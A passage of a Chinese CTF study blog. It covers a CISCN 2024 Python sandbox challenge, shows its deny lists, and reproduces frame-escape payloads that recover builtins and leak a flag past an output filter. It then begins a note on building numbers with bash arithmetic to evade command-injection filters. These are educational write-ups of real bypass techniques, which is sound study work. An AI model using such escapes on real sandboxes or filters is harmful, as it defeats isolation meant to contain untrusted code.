class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="built_in">id</span> = <span class="built_in">str</span>(uuid1())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.json</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">            runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag).replace(<span class="string">&quot;THIS_IS_TASK_RANDOM_ID&quot;</span>, <span class="built_in">id</span>))</span><br><span class="line">        <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(data.get(<span class="string">&quot;code&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        run = subprocess.run(</span><br><span class="line">            [<span class="string">&#x27;python&#x27;</span>, <span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>],</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.PIPE,</span><br><span class="line">            timeout=<span class="number">3</span></span><br><span class="line">        )</span><br><span class="line">        result = run.stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        error = run.stderr.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(result, error)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;result&#125;</span>\n<span class="subst">&#123;error&#125;</span>&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.py&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>):</span><br><span class="line">            os.remove(<span class="string">f&quot;/app/uploads/<span class="subst">&#123;<span class="built_in">id</span>&#125;</span>.txt&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;</span><br><span class="line">            <span class="string">&quot;result&quot;</span>: <span class="string">&quot;None&quot;</span></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>runner.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">source_simple_check</span>(<span class="params">source</span>):</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source with pure string in string, prevent dangerous strings</span></span><br><span class="line"><span class="string">    :param source: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        source.encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> UnicodeEncodeError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;non-ascii is not permitted&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span>]:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> source.lower():</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">block_wrapper</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the run process with sys.audithook, no dangerous operations should be conduct</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">audit</span>(<span class="params">event, args</span>):</span><br><span class="line"></span><br><span class="line">        <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span>, <span class="built_in">print</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span>]:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> (event + <span class="string">&quot;&quot;</span>.join(<span class="built_in">str</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> args)).lower():</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">                os._exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> audit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source_opcode_checker</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Check the source in the bytecode aspect, no methods and globals should be load</span></span><br><span class="line"><span class="string">    :param code: source code</span></span><br><span class="line"><span class="string">    :return: None</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> dis <span class="keyword">import</span> dis</span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> exit</span><br><span class="line"></span><br><span class="line">    opcodeIO = StringIO()</span><br><span class="line">    dis(code, file=opcodeIO)</span><br><span class="line">    opcode = opcodeIO.getvalue().split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    opcodeIO.close()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> opcode:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(x <span class="keyword">in</span> <span class="built_in">str</span>(line) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;randint&quot;</span>, <span class="string">&quot;randrange&quot;</span>, <span class="string">&quot;print&quot;</span>, <span class="string">&quot;seed&quot;</span>]):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join([x <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="string">&quot;LOAD_GLOBAL&quot;</span>, <span class="string">&quot;IMPORT_NAME&quot;</span>, <span class="string">&quot;LOAD_METHOD&quot;</span>] <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>(line)]))</span><br><span class="line">            exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> builtins <span class="keyword">import</span> <span class="built_in">open</span></span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> addaudithook</span><br><span class="line">    <span class="keyword">from</span> contextlib <span class="keyword">import</span> redirect_stdout</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> randint, randrange, seed</span><br><span class="line">    <span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line">    <span class="keyword">from</span> random <span class="keyword">import</span> seed</span><br><span class="line">    <span class="keyword">from</span> time <span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">    source = <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/THIS_IS_TASK_RANDOM_ID.txt&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    source_simple_check(source)</span><br><span class="line">    source_opcode_checker(source)</span><br><span class="line">    code = <span class="built_in">compile</span>(source, <span class="string">&quot;&lt;sandbox&gt;&quot;</span>, <span class="string">&quot;exec&quot;</span>)</span><br><span class="line">    addaudithook(block_wrapper())</span><br><span class="line">    outputIO = StringIO()</span><br><span class="line">    <span class="keyword">with</span> redirect_stdout(outputIO):</span><br><span class="line">        seed(<span class="built_in">str</span>(time()) + <span class="string">&quot;THIS_IS_SEED&quot;</span> + <span class="built_in">str</span>(time()))</span><br><span class="line">        <span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br><span class="line">    output = outputIO.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure>

<p>关键代码，在runner.py中，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">source_simple_check函数中：禁了<span class="string">&quot;__&quot;</span>, <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;exit&quot;</span></span><br><span class="line">block_wrapper函数中，禁了<span class="string">&quot;marshal&quot;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&quot;process&quot;</span>, <span class="string">&quot;os&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;interpreter&quot;</span>, <span class="string">&quot;cpython&quot;</span>, <span class="string">&quot;open&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;gc&quot;</span></span><br><span class="line">禁了gc模块</span><br><span class="line">source_opcode_checker函数要求opcode解释出来还不能有LOAD_GLOBAL、IMPORT_NAME、 LOAD_METHOD</span><br><span class="line"></span><br><span class="line">其他地方，这里将内建函数禁了，那么这里就用不了`<span class="built_in">next</span>()`函数</span><br><span class="line"><span class="built_in">exec</span>(code, &#123;</span><br><span class="line">            <span class="string">&quot;__builtins__&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&quot;randint&quot;</span>: randint,</span><br><span class="line">            <span class="string">&quot;randrange&quot;</span>: randrange,</span><br><span class="line">            <span class="string">&quot;seed&quot;</span>: seed,</span><br><span class="line">            <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span></span><br><span class="line">        &#125;, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure>

<p>先看了一下其他师傅的wp，我最开始不是很懂为什么会得到flag的值，审计代码+测试代码搞懂了，首先注意下面这一个部分代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">open(f&quot;/app/uploads/&#123;id&#125;.py&quot;, &quot;w&quot;, encoding=&quot;UTF-8&quot;).write(</span><br><span class="line">            runner.replace(&quot;THIS_IS_SEED&quot;, flag).replace(&quot;THIS_IS_TASK_RANDOM_ID&quot;, id))</span><br></pre></td></tr></table></figure>

<p>这里应该是flag的值没有被改变，只是在写进去的时候被改变了，出题人就是在这里“不安好心”，先看测试代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    flag=<span class="string">&quot;flag&#123;ajhduiahdu&#125;&quot;</span></span><br><span class="line">    <span class="built_in">open</span>(<span class="string">f&quot;/app/uploads/1234.py&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;UTF-8&quot;</span>).write(</span><br><span class="line">        runner.replace(<span class="string">&quot;THIS_IS_SEED&quot;</span>, flag))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dis.dis(haha))</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line"><span class="number">3</span>           <span class="number">0</span> LOAD_CONST               <span class="number">1</span> (<span class="string">&#x27;flag&#123;ajhduiahdu&#125;&#x27;</span>)</span><br><span class="line">              <span class="number">2</span> STORE_FAST               <span class="number">0</span> (flag)</span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>           <span class="number">4</span> LOAD_GLOBAL              <span class="number">0</span> (<span class="built_in">open</span>)</span><br><span class="line">              <span class="number">6</span> LOAD_CONST               <span class="number">2</span> (<span class="string">&#x27;/app/uploads/1234.py&#x27;</span>)</span><br><span class="line">              <span class="number">8</span> LOAD_CONST               <span class="number">3</span> (<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">             <span class="number">10</span> LOAD_CONST               <span class="number">4</span> (<span class="string">&#x27;UTF-8&#x27;</span>)</span><br><span class="line">             <span class="number">12</span> LOAD_CONST               <span class="number">5</span> ((<span class="string">&#x27;encoding&#x27;</span>,))</span><br><span class="line">             <span class="number">14</span> CALL_FUNCTION_KW         <span class="number">3</span></span><br><span class="line">             <span class="number">16</span> LOAD_METHOD              <span class="number">1</span> (write)</span><br><span class="line"></span><br><span class="line">  <span class="number">5</span>          <span class="number">18</span> LOAD_GLOBAL              <span class="number">2</span> (runner)</span><br><span class="line">             <span class="number">20</span> LOAD_METHOD              <span class="number">3</span> (replace)</span><br><span class="line">             <span class="number">22</span> LOAD_CONST               <span class="number">6</span> (<span class="string">&#x27;THIS_IS_SEED&#x27;</span>)</span><br><span class="line">             <span class="number">24</span> LOAD_FAST                <span class="number">0</span> (flag)</span><br><span class="line">             <span class="number">26</span> CALL_METHOD              <span class="number">2</span></span><br><span class="line"></span><br><span class="line">  <span class="number">4</span>          <span class="number">28</span> CALL_METHOD              <span class="number">1</span></span><br><span class="line">             <span class="number">30</span> POP_TOP</span><br><span class="line">             <span class="number">32</span> LOAD_CONST               <span class="number">0</span> (<span class="literal">None</span>)</span><br><span class="line">             <span class="number">34</span> RETURN_VALUE</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>可以看到字节码中已经有了完整的<code>THIS_IS_SEED</code>，所以在我们输出时肯定有这个被输出，但是这个被禁了，如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&quot;THIS_IS_SEED&quot;</span> <span class="keyword">in</span> output:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;这 runtime 你就嘎嘎写吧， 一写一个不吱声啊，点儿都没拦住！&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;bad code-operation why still happened ah?&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>这里限制了输出不能有<code>THIS_IS_SEED</code>，所以需要绕过，如何绕过呢</p>
<p>就是将被禁的字符分开打印出来，使得不会匹配整个字符串，直接给其他师傅的paylaod，学习一下构造方案：<br>jay17师傅：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">scq</span>():</span><br><span class="line">        <span class="keyword">yield</span> scq.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">    scq = scq()  <span class="comment">#生成器</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># frame = next(scq)  # 获取到生成器的栈帧对象</span></span><br><span class="line">    frame = [x <span class="keyword">for</span> x <span class="keyword">in</span> scq][<span class="number">0</span>] <span class="comment">#由于生成器也是迭代器，所以也可以获取到生成器的栈帧对象</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(frame)</span></span><br><span class="line">    <span class="comment"># print(frame.f_back)</span></span><br><span class="line">    gattr = frame.f_back.f_back.f_back.f_globals[<span class="string">&quot;_&quot;</span>*<span class="number">2</span>+<span class="string">&quot;builtins&quot;</span>+<span class="string">&quot;_&quot;</span>*<span class="number">2</span>]  <span class="comment">#[&#x27;_&#x27;&#x27;_bui&#x27;&#x27;ltins_&#x27;&#x27;_&#x27;]也行</span></span><br><span class="line">    <span class="built_in">dir</span> = gattr.<span class="built_in">dir</span></span><br><span class="line">    <span class="built_in">str</span> = gattr.<span class="built_in">str</span>  <span class="comment"># 获取str方法</span></span><br><span class="line"></span><br><span class="line">    getflag = frame.f_back.f_back.f_back.f_code</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">dir</span>(getflag))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(getflag.co_consts):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>审一下代码，三个点比较重要：</p>
<ul>
<li><p>利用字节码来读</p>
</li>
<li><p>在全局空间对应的内置空间获得函数，</p>
</li>
<li><p>其次就是下面这个代码了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(getflag.co_consts):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>前两个点不用说了，前面笔记有，主要看第三个点为什么可以这样读出来</p>
<p>直接给代码测试：</p>
<p>先给没有<code>str()</code>的结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag =<span class="string">&quot;aoidhjaiodhj&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=haha()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_code.co_consts</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line">Output:</span><br><span class="line">aoidhjaiodhj</span><br><span class="line">&lt;code <span class="built_in">object</span> haha at <span class="number">0x0000026423B663A0</span>, file <span class="string">&quot;D:\clx\ceshi.py&quot;</span>, line <span class="number">2</span>&gt;</span><br><span class="line">haha</span><br><span class="line"><span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>再来看看使用<code>str()</code>转换为字符串的结果：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag =<span class="string">&quot;aoidhjaiodhj&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">haha</span>():</span><br><span class="line">    <span class="keyword">yield</span> g.gi_frame.f_back</span><br><span class="line"></span><br><span class="line">g=haha()</span><br><span class="line">c=<span class="built_in">next</span>(g)</span><br><span class="line">d=c.f_code.co_consts</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>(d):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Output(部分):</span><br><span class="line">(</span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">j</span></span><br><span class="line"><span class="string">a</span></span><br><span class="line"><span class="string">i</span></span><br><span class="line"><span class="string">o</span></span><br><span class="line"><span class="string">d</span></span><br><span class="line"><span class="string">h</span></span><br><span class="line"><span class="string">j</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>

<p>对比可以看出这里当被转换为字符串时再使用for循环可以在读取一个字符就输出。这想到，牛逼。</p>
<p>还有<a href="https://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/">boogipop师傅</a>的，payload如下：</p>
<p>对flag字符串有过滤，如下构造：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">boogipop</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">        <span class="keyword">yield</span> pop.gi_frame.f_back.f_back.f_back</span><br><span class="line">    pop = exp()</span><br><span class="line">    <span class="keyword">for</span> exp <span class="keyword">in</span> pop:</span><br><span class="line">        boo=exp</span><br><span class="line">    <span class="keyword">return</span> boo</span><br><span class="line">kino=boogipop()</span><br><span class="line"><span class="built_in">print</span>(kino.f_code.co_consts[<span class="number">19</span>][<span class="number">1</span>:])</span><br></pre></td></tr></table></figure>

<p>主要了解一下<code>[19][1:]</code>，解答如下：</p>
<ol>
<li>**<code>[19]</code>**：<ul>
<li>获取常量池中的第 19 个常量。常量池包含所有字面值（如字符串、数字）、函数对象、<code>None</code>、以及其他常量。</li>
</ul>
</li>
<li>**<code>[1:]</code>**：<ul>
<li>对该常量（假设是字符串）进行切片操作，获取从第二个字符到最后一个字符的部分。</li>
</ul>
</li>
</ol>
<p>假设第 19 个常量是一个字符串 <code>hello world</code>。那么：</p>
<ul>
<li><code>kino.f_code.co_consts[19]</code> 将是 <code>&#39;hello world&#39;</code>。</li>
<li><code>kino.f_code.co_consts[19][1:]</code> 将是 <code>&#39;ello world&#39;</code>。</li>
</ul>
<p>因此，这段代码最终会打印 <code>kino.f_code.co_consts[19][1:]</code>，其中假设第 19 个常量是一个字符串，这个切片操作会打印出该字符串从第二个字符开始到最后的部分。</p>
<p>复现总结，栈帧逃逸个人感觉考的就是在逃逸过后怎么操作，这就靠对python基础知识的积累了。</p>
<p>笔记参考文章：<code>https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi%3DDteDsD7md0%3DdG%3DdSMOkdxWD&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F</code></p>
<p><code>https://blog.csdn.net/spiritx/article/details/132504456</code></p>
<p><code>https://blog.csdn.net/MXB_1220/article/details/124638449</code></p>
<p><code>https://gairuo.com/p/python-function-code</code></p>
<p><code>https://www.cnblogs.com/yangmingxianshen/p/11252541.html</code></p>
<p><code>https://www.cnblogs.com/traditional/p/13524591.html</code></p>
]]></content>
      <categories>
        <category>Python漏洞</category>
        <category>Python栈帧逃逸</category>
      </categories>
  </entry>
  <entry>
    <title>rce之利用shell变量</title>
    <url>/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/</url>
    <content><![CDATA[<h3 id="rce-‘新’进阶"><a href="#rce-‘新’进阶" class="headerlink" title="rce ‘新’进阶"></a>rce ‘新’进阶</h3><p>现在稍微大型的比赛都不会考那些已经算是比较常见、常用、简单的绕过如简单的取反、自增等，需要进阶学习纪录一下。此为学习者笔记,还是<strong>强调知识点融会贯通</strong></p>
<span id="more"></span>

<h3 id="命令执行之构造数字"><a href="#命令执行之构造数字" class="headerlink" title="命令执行之构造数字"></a>命令执行之构造数字</h3><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p><strong>在linux中<code>$(())</code>用于算术运算</strong>，在这个表达式中，你可以放入任何想要计算的运算式。</p>
<p>先看下面这个式子：</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602213327932.png" alt="image-20240602213327932"></p>
<p>这个式子中并没有给出任何具体的运算内容，系统默认执行了一个空的算数运算。所以在没有明确运算目标的情况下，**<code>$(())</code>返回的默认值是0**。（同时注意，个人认为，注意看payload以及执行情况，<code>$(())</code>本生就会执行后返回结果，不需要套一个<code>eval()</code>这种类似的执行函数）</p>
<p>看看给了的正常的运算符</p>
<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214355554.png" alt="image-20240602214355554"></p>
<p>重点来了，尝试将上面那个0取反<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214522539.png" alt="image-20240602214522539"></p>
<p>得到-1，那么再取反一次<code>-2</code>看看<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214739811.png" alt="image-20240602214739811"></p>
<p>这里又得到了1，linux中的取反操作时针对二进制进行的，那么现在就可以通过相加减获得数字。</p>
<p>比如想要获得1，就可以像上面一样构造，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215641095.png" alt="image-20240602215641095"></p>
<p>现在想要构造就很简单了，比如又想构造<code>2</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215758986.png" alt="image-20240602215758986"></p>
<p>这样就可以构造任意数字。</p>
<p><strong>同时注意加号在某些情况下可以省略</strong>（建议在去掉+号前先看看没去+号是什么样子的），比如那个生成1的payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原：</span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br><span class="line"></span><br><span class="line">去掉+号后</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))))))  如下图</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222226786.png" alt="image-20240602222226786"></p>
<p>成功执行。</p>
<p>但是注意，为什么要加某些情况下呢，比如下面这个测试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line">生成2的payload，那么现在将+去掉，如下：</span><br><span class="line">echo $(($((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222408309.png" alt="image-20240602222408309"></p>
<p>这里生成的却是11，嘿嘿，这是怎么回事，注意看这个payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line"></span><br><span class="line">先像上面那个1那样只去掉构造出1的+号，再看看执行结果，如下：</span><br><span class="line">$(($((~$(($((~$(())))$((~$(())))))))+$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222634293.png" alt="image-20240602222634293"></p>
<p>成功得到2，那么为什么将中间那个<code>+</code>去掉就不对了呢，个人认为是符号判定的问题，用代码表示一下去掉<code>+</code>后的情况：</p>
